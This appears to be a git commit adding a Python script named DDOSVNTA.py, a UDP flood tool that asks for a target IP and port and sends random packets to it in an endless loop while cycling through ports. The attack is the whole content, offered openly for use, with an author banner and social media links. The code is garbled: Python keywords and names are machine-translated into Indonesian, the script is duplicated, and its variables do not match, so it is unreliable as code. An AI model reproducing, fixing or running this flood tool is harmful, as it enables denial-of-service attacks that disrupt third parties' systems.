f18af82a2c9e9b539fbd925b42231c5aba10250f
vnta45 <82139937+vnta45@users.noreply.github.com>
2021-06-29 21:24:03 +0700

    Add files via upload

---
+++ DDOSVNTA.py
@@ -0,0 +1,99 @@
+ sistem impor
+impor  os
+ waktu impor
+ soket impor
+impor  acak
+#Kode Waktu
+dari  datetime  impor  datetime
+sekarang  = tanggal  waktu . sekarang ()
+jam  =  sekarang . jam
+menit  =  sekarang . menit
+hari  =  sekarang . hari
+bulan  =  sekarang . bulan
+tahun  =  sekarang . tahun
+
+####################
+kaus kaki  =  soket . soket ( soket . AF_INET , soket . SOCK_DGRAM )
+byte  =  acak . _urandom ( 1490 )
+###################
+
+os . sistem ( "jelas" )
+os . sistem ( "Figlet DDos Attack" )
+mencetak
+print  "Penulis : VNTA×HURTED07"
+print  "You Tube : https://www.youtube.com/c/VNTAHURTED"
+cetak  "github : https://github.com/vnta05"
+print  "Instagram : https://instagram.com/mrvnta08?utm_medium=copy_link"
+impor  os
+ waktu impor
+ soket impor
+impor  acak
+#Kode Waktu
+dari  datetime  impor  datetime
+sekarang  = tanggal  waktu . sekarang ()
+jam  =  sekarang . jam
+menit  =  sekarang . menit
+hari  =  sekarang . hari
+bulan  =  sekarang . bulan
+tahun  =  sekarang . tahun
+
+####################
+kaus kaki  =  soket . soket ( soket . AF_INET , soket . SOCK_DGRAM )
+byte  =  acak . _urandom ( 1490 )
+###################
+
+os . sistem ( "jelas" )
+os . sistem ( "DDOSSVNTA ATTACK" )
+mencetak
+print  "Penulis : HA-MRX"
+print  "You Tube : https://www.youtube.com/c/HA-MRX"
+cetak  "github : https://github.com/Ha3MrX"
+print  "Facebook : "
+mencetak
+ip  =  raw_input ( "Target IP : " )
+port  =  masukan ( "Port : " )
+
+os . sistem ( "jelas" )
+os . sistem ( "Figlet Serangan Mulai" )
+cetak  "[ ] 0% "
+waktu . tidur ( 5 )
+cetak  "[===== ] 25%"
+waktu . tidur ( 5 )
+cetak  "[========== ] 50%"
+waktu . tidur ( 5 )
+cetak  "[================ ] 75%"
+waktu . tidur ( 5 )
+cetak  "[====================] 100%"
+waktu . tidur ( 3 )
+dikirim  =  0
+sedangkan  Benar :
+     kaus kaki . sendto ( byte , ( ip , port ))
+     terkirim  =  terkirim  +  1
+     pelabuhan  =  pelabuhan  +  1
+     print  "Mengirim paket %s ke %s melalui port:%s" % ( terkirim , ip , port )
+     jika  port  ==  65534 :
+       pelabuhan  =  1"
+mencetak
+ip  =  raw_input ( "Target IP : " )
+port  =  masukan ( "Port : " )
+
+os . sistem ( "jelas" )
+os . sistem ( "Figlet Serangan Mulai" )
+cetak  "[ ] 0% "
+waktu . tidur ( 5 )
+cetak  "[===== ] 25%"
+waktu . tidur ( 5 )
+cetak  "[========== ] 50%"
+waktu . tidur ( 5 )
+cetak  "[================ ] 75%"
+waktu . tidur ( 5 )
+cetak  "[====================] 100%"
+waktu . tidur ( 3 )
+dikirim  =  0
+sedangkan  Benar :
+     kaus kaki . sendto ( byte , ( ip , port ))
+     terkirim  =  terkirim  +  1
+     pelabuhan  =  pelabuhan  +  1
+     print  "Mengirim paket %s ke %s melalui port:%s" % ( terkirim , ip , port )
+     jika  port  ==  65534 :
+       pelabuhan  =  1
